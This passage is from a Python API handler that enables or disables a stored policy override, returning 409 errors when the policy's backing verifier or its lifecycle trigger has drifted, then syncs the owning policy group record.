                            # 409 conflict, not 422: the request body
                            # is well-formed; the world the policy
                            # references has drifted out from under
                            # it. Operator action = re-author with
                            # current /verifiers or 'preview:' prefix.
                            raise HTTPException(
                                409,
                                f"cannot re-enable: backing verifier "
                                f"{e.step!r} no longer registered — "
                                f"re-author with current /verifiers "
                                f"or 'preview:' prefix",
                            ) from e
                        # D57e P0: also detect lifecycle drift on
                        # re-arm. A row authored before D57e against
                        # `(PostToolUse, citation_verify)` resolves
                        # cleanly above (citation_verify is still
                        # registered), but the descriptor no longer
                        # endorses that lifecycle and the runtime
                        # would silently round-trip a vacuous gate.
                        # 409 with the allowed-lifecycles list mirrors
                        # the decommissioned-verifier branch so the
                        # operator sees the same actionable shape.
                        from ...verifier.descriptors import (
                            validate_policy_against_descriptors,
                        )
                        _trig = getattr(ov.policy, "trigger", None)
                        _event = (
                            getattr(_trig, "event", None)
                            if _trig is not None else None
                        )
                        _step_refs = [
                            r.step for r in ov.policy.requires
                            if r.kind == "step"
                            and isinstance(getattr(r, "step", None), str)
                        ]
                        _drift_issues = (
                            validate_policy_against_descriptors(
                                policy_id=ov.policy.id,
                                trigger_event=_event or "",
                                step_refs=_step_refs,
                            )
                            if isinstance(_event, str) and _event
                            else []
                        )
                        if _drift_issues:
                            _first = _drift_issues[0]
                            raise HTTPException(
                                409,
                                (
                                    f"cannot re-enable: verifier "
                                    f"{_first['step']!r} no longer "
                                    f"fires on "
                                    f"{_first['trigger_event']!r}; "
                                    f"allowed lifecycles: "
                                    f"{_first['allowed_events']!r} — "
                                    f"re-author this policy under one "
                                    f"of those lifecycles"
                                ),
                            )
                    new_list.append(PolicyOverride(
                        policy=ov.policy, source=ov.source, enabled=body.enabled,
                        # P8: enable/disable is metadata-only; preserve
                        # the stamped enforcement on disable. On enable
                        # we re-resolve (see above) so a re-armed row
                        # carries a label that matches today's
                        # registry, not whatever was wired at PUT
                        # time.
                        enforcement=new_enforcement,
                    ))
                else:
                    new_list.append(ov)
            if not found:
                raise HTTPException(404, f"policy {policy_id!r} not found")
            store.save(new_list)
            # Keep the owning PolicyRecord.enabled in sync so the grouped view
            # (which derives enabled from rules) and the record agree.
            if owning is not None:
                groups = policy_group_store.load()
                for i, rec in enumerate(groups):
                    if rec.id == owning.id:
                        rec.enabled = body.enabled
                        groups[i] = rec
                        break
                policy_group_store.save(groups)
        return {"id": policy_id, "enabled": body.enabled,
                "cascaded_rule_ids": sorted(target_ids) if owning else [policy_id]}


